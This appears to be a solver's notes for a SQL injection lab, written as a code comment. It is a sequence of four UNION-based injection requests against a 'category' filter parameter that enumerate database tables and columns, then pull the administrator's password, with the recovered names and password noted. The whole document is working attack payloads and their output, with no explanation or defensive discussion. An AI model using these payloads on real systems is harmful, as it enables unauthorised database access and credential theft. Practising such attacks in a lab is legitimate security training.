/*
1) GET /filter?category='+UNION+SELECT+NULL,NULL+FROM+information_schema.tables-- HTTP/2

2) GET /filter?category='+UNION+SELECT+table_name,NULL+FROM+information_schema.tables-- HTTP/2
//users_euqgus

3) GET /filter?category='+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_euqgus'-- HTTP/2
//password_wjfbkx
//username_lsfcov

4) GET /filter?category='+UNION+SELECT+password_wjfbkx,+NULL+FROM+users_euqgus+WHERE+username_lsfcov='administrator'-- HTTP/2
//vhw7njym5a2v5gxhxysx

    OR

4) GET /filter?category='+UNION+SELECT+password_wjfbkx,+username_lsfcov+FROM+users_euqgus-- HTTP/2


*/